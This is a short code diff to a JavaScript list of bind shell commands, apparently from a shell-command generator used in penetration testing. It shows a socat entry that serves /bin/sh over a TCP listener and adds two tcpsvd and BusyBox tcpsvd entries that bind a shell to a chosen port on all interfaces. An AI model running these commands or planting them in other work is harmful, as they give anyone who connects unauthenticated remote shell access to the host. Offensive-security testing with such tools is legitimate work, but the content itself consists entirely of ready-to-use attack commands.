@@ -449,6 +449,16 @@ const bindShellCommands =  withCommandType(
             "name": "Socat (TTY) Bind",
             "command": "socat TCP-LISTEN:{port},reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane",
             "meta": ["bind", "mac", "linux"]
+        },
+        {
+            "name": "tcpsvd Bind",
+            "command": "tcpsvd -vE 0.0.0.0 {port} {shell} -i",
+            "meta": ["bind", "linux"]
+        },
+        {
+            "name": "BusyBox tcpsvd Bind",
+            "command": "busybox tcpsvd -vE 0.0.0.0 {port} {shell} -i",
+            "meta": ["bind", "linux"]
         }
     ]
 );
